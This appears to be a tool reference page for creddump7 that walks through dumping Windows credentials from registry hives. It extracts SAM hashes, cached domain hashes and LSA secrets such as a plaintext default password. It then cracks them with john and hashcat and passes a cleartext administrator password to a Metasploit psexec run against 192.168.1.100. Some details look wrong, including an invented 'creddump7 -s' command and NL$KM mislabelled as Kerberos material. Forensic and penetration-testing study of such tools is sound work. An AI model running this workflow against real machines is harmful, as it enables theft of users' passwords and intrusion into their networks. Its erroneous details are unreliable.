---
title: "creddump7 - Windows Credential Extractor"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Credential Dumping"
  - "Credential Access"
  - "Password Attacks"
tags:
  - "creddump7"
  - "credential-dumping"
  - "windows"
  - "sam"
  - "lsa"
  - "cached-credentials"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Credential Dumping
mitre_technique_id: T1003
version: "latest"
tool_url: "https://github.com/CiscoCXSecurity/creddump7"
kali_url: "https://www.kali.org/tools/creddump7/"
license: "GPL-3.0"
---

# creddump7 - Windows Credential Extractor

## Overview

**creddump7** is a Python tool to extract various credentials and secrets from Windows registry hives. It is a maintained fork of the original creddump project, combining many patches and fixes to support Windows Vista/7 and later systems. It extracts LM/NT hashes, cached domain passwords, and LSA secrets in a platform-independent way.

**Key Features**:
- **Platform independent** - Works on Linux, macOS, and Windows
- **Offline extraction** - No need to boot Windows
- **Multiple credential types** - SAM, LSA secrets, cached domain credentials
- **Python-based** - Easy to extend and customize
- **No dependencies** - Uses standard Python libraries
- **Vista/7+ support** - Updated for modern Windows versions

**Supported Extractions**:
- **pwdump** - LM and NT hashes from SAM database
- **cachedump** - Cached domain credentials (DCC2)
- **lsadump** - LSA secrets (service account passwords, etc.)

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y creddump7
```

### From Source

```bash
# Install dependencies
pip3 install pycryptodome

# Clone repository
git clone https://github.com/CiscoCXSecurity/creddump7
cd creddump7
```

## Command Reference

### Core Tools

| Tool | Description |
|------|-------------|
| `pwdump.py` | Extract LM/NT hashes from SAM |
| `cachedump.py` | Extract cached domain credentials |
| `lsadump.py` | Extract LSA secrets |

### Usage Syntax

```bash
# pwdump - Extract password hashes
python3 pwdump.py <system_hive> <sam_hive>

# cachedump - Extract cached domain credentials
python3 cachedump.py <system_hive> <security_hive> <vista7_flag>

# lsadump - Extract LSA secrets
python3 lsadump.py <system_hive> <security_hive>
```

## Usage Examples

### Mount Windows Partition

```bash
# Linux
mkdir /mnt/windows
mount -t ntfs-3g /dev/sda1 /mnt/windows

# Define hive paths
SYSTEM="/mnt/windows/Windows/System32/config/SYSTEM"
SAM="/mnt/windows/Windows/System32/config/SAM"
SECURITY="/mnt/windows/Windows/System32/config/SECURITY"
```

### Extract Password Hashes (pwdump)

**Windows Vista/7/8/10/11**:
```bash
python3 pwdump.py $SYSTEM $SAM
```

**Windows XP/2003**:
```bash
python3 pwdump.py $SYSTEM $SAM
```

**Output Example**:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Jane:1001:aad3b435b51404eeaad3b435b51404ee:2b836f3c2a5b6b2f0e2f2f5b2f5b2f5b:::
```

**Hash Format**: `username:RID:LM_hash:NT_hash:::`

### Extract Cached Domain Credentials (cachedump)

**Windows Vista/7/8/10/11**:
```bash
python3 cachedump.py $SYSTEM $SECURITY true
```

**Windows XP/2003**:
```bash
python3 cachedump.py $SYSTEM $SECURITY false
```

**Output Example**:
```
nharpsis:6b29dfa157face3f3d8db489aec5cc12:acme:acme.local
god:25bd785b8ff1b7fa3a9b9e069a5e7de7:acme:acme.local
```

**Hash Format**: `username:DCC2_hash:domain:domain_fqdn`

### Extract LSA Secrets (lsadump)

```bash
python3 lsadump.py $SYSTEM $SECURITY
```

**Output Example**:
```
$MACHINE.ACC: 
  hex: 01000000000000000000000000000000
  dec: .
  str: .

DefaultPassword: 
  hex: 740065007300740070006100730073000000
  dec: .t.e.s.t.p.a.s.s.
  str: testpass

NL$KM: 
  hex: 8c9e150000000000000000000000000000000000000000000000000000000000
  dec: ................................
  str: ................................
```

**LSA Secret Types**:
- **DefaultPassword** - Default Windows password
- **NL$KM** - Kerberos key material
- **$MACHINE.ACC** - Machine account password
- **Service account passwords** - Stored service credentials

### Complete Credential Extraction

**Extract All Credentials**:
```bash
# Create output directory
mkdir -p /forensics/credentials

# Extract SAM hashes
python3 pwdump.py $SYSTEM $SAM > /forensics/credentials/sam_hashes.txt

# Extract cached domain credentials
python3 cachedump.py $SYSTEM $SECURITY true > /forensics/credentials/cached_hashes.txt

# Extract LSA secrets
python3 lsadump.py $SYSTEM $SECURITY > /forensics/credentials/lsa_secrets.txt
```

### Crack Extracted Hashes

**LM/NT Hashes (SAM)**:
```bash
# With John the Ripper
john --format=nt /forensics/credentials/sam_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With Hashcat
hashcat -m 1000 /forensics/credentials/sam_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cached Domain Credentials**:
```bash
# With John the Ripper
john --format=mscash2 /forensics/credentials/cached_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With Hashcat
hashcat -m 2100 /forensics/credentials/cached_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Offline Forensic Analysis

**Copy Hives for Analysis**:
```bash
# Copy hives
cp $SYSTEM /forensics/
cp $SAM /forensics/
cp $SECURITY /forensics/

# Unmount
umount /mnt/windows
```

**Analyze Offline**:
```bash
# Extract all credentials
python3 pwdump.py /forensics/SYSTEM /forensics/SAM > sam_hashes.txt
python3 cachedump.py /forensics/SYSTEM /forensics/SECURITY true > cached_hashes.txt
python3 lsadump.py /forensics/SYSTEM /forensics/SECURITY > lsa_secrets.txt

# Crack hashes
john --format=nt sam_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=mscash2 cached_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Integration with Other Tools

**Impacket Integration**:
```bash
# Use impacket for additional analysis
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**Metasploit Integration**:
```bash
# Use credentials in Metasploit
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser administrator; set SMBPass password123; exploit"
```

### Batch Operations

**Extract from Multiple Systems**:
```bash
# Create hive list
echo "/forensics/system1/SYSTEM" > hive_list.txt
echo "/forensics/system1/SAM" >> hive_list.txt
echo "/forensics/system2/SYSTEM" >> hive_list.txt
echo "/forensics/system2/SAM" >> hive_list.txt

# Extract from each system
while read system; do
    read sam
    python3 pwdump.py $system $sam >> all_hashes.txt
done < hive_list.txt
```

**Parallel Extraction**:
```bash
# Extract from multiple systems in parallel
for system in /forensics/*/SYSTEM; do
    dir=$(dirname $system)
    python3 pwdump.py $system $dir/SAM > ${dir}_hashes.txt &
done
wait
```

## Output Interpretation

### LM/NT Hash Format

```
username:RID:LM_hash:NT_hash:::
```

**Example**:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Fields**:
- **username**: Account name
- **RID**: Relative Identifier (user ID)
- **LM_hash**: LAN Manager hash (often empty on modern systems)
- **NT_hash**: NT LAN Manager hash (crackable)

### Cached Domain Credential Format

```
username:DCC2_hash:domain:domain_fqdn
```

**Example**:
```
nharpsis:6b29dfa157face3f3d8db489aec5cc12:acme:acme.local
```

**Fields**:
- **username**: Domain account name
- **DCC2_hash**: DCC2 (Domain Cached Credentials version 2) hash
- **domain**: NetBIOS domain name
- **domain_fqdn**: Fully qualified domain name

### LSA Secret Format

```
secret_name: 
  hex: hex_value
  dec: decimal_value
  str: string_value
```

**Example**:
```
DefaultPassword: 
  hex: 740065007300740070006100730073000000
  dec: .t.e.s.t.p.a.s.s.
  str: testpass
```

## Integration with Other Tools

### SAM + SYSTEM → Hash Cracking

```bash
# Extract hashes
python3 pwdump.py SYSTEM SAM > hashes.txt

# Crack with John
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack with Hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Cached Credentials → Hash Cracking

```bash
# Extract cached credentials
python3 cachedump.py SYSTEM SECURITY true > cached_hashes.txt

# Crack with John
john --format=mscash2 cached_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### LSA Secrets → Password Recovery

```bash
# Extract LSA secrets
python3 lsadump.py SYSTEM SECURITY > lsa_secrets.txt

# View secrets
cat lsa_secrets.txt
```

## Operational Security

### Backup Before Extraction

```bash
# Create backups
cp SAM SAM.backup
cp SYSTEM SYSTEM.backup
cp SECURITY SECURITY.backup
```

### Secure Hash Storage

```bash
# Store hashes securely
chmod 600 hashes.txt
chown root:root hashes.txt
```

## Common Issues and Troubleshooting

### Issue: "File not found"

**Cause**: Wrong path or Windows version.

**Solution**:
```bash
# Check path
ls /mnt/windows/Windows/System32/config/SAM

# Try alternative paths
ls /mnt/windows/WINDOWS/System32/config/SAM
ls /mnt/windows/WinNT/System32/config/SAM
```

### Issue: "Permission denied"

**Cause**: File system permissions.

**Solution**:
```bash
# Remount with write permissions
mount -t ntfs-3g -o rw /dev/sda1 /mnt/windows

# Or use sudo
sudo python3 pwdump.py SYSTEM SAM
```

### Issue: "SAM is locked"

**Cause**: Windows is hibernated or fast startup enabled.

**Solution**:
```bash
# Disable hibernation in Windows
powercfg -h off

# Or force mount
mount -t ntfs-3g -o rw,recover /dev/sda1 /mnt/windows
```

### Issue: "Hash extraction failed"

**Cause**: Corrupted SAM or SYSTEM hive.

**Solution**:
```bash
# Try alternative extraction method
creddump7 -s SYSTEM SAM > hashes.txt

# Or use impacket
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Issue: "Python version error"

**Cause**: Wrong Python version.

**Solution**:
```bash
# Use Python 3
python3 pwdump.py SYSTEM SAM

# Check Python version
python3 --version
```

## Best Practices

### Complete Credential Extraction

```bash
# 1. Mount partition
mkdir /mnt/windows
mount -t ntfs-3g /dev/sda1 /mnt/windows

# 2. Define paths
SYSTEM="/mnt/windows/Windows/System32/config/SYSTEM"
SAM="/mnt/windows/Windows/System32/config/SAM"
SECURITY="/mnt/windows/Windows/System32/config/SECURITY"

# 3. Extract all credentials
python3 pwdump.py $SYSTEM $SAM > sam_hashes.txt
python3 cachedump.py $SYSTEM $SECURITY true > cached_hashes.txt
python3 lsadump.py $SYSTEM $SECURITY > lsa_secrets.txt

# 4. Unmount
umount /mnt/windows

# 5. Crack hashes
john --format=nt sam_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=mscash2 cached_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Forensic Workflow

```bash
# 1. Create forensic image
dd if=/dev/sda1 of=/forensics/windows.raw bs=4M

# 2. Mount image
mount -t ntfs-3g -o loop /forensics/windows.raw /mnt/windows

# 3. Extract credentials
python3 pwdump.py $SYSTEM $SAM > sam_hashes.txt
python3 cachedump.py $SYSTEM $SECURITY true > cached_hashes.txt
python3 lsadump.py $SYSTEM $SECURITY > lsa_secrets.txt

# 4. Unmount
umount /mnt/windows
```

## Resources

- **GitHub Repository**: https://github.com/CiscoCXSecurity/creddump7
- **Kali Linux Tools**: https://www.kali.org/tools/creddump7/
- **Original Project**: https://code.google.com/p/creddump/
- **License**: GPL-3.0

## Related Tools

- **chntpw**: Windows password hash editor
- **samdump2**: Extract password hashes from Windows SAM database
- **mimikatz**: Windows credential dumping tool (runs on Windows)
- **Responder**: LLMNR/NBT-NS/MDNS poisoner for credential capture
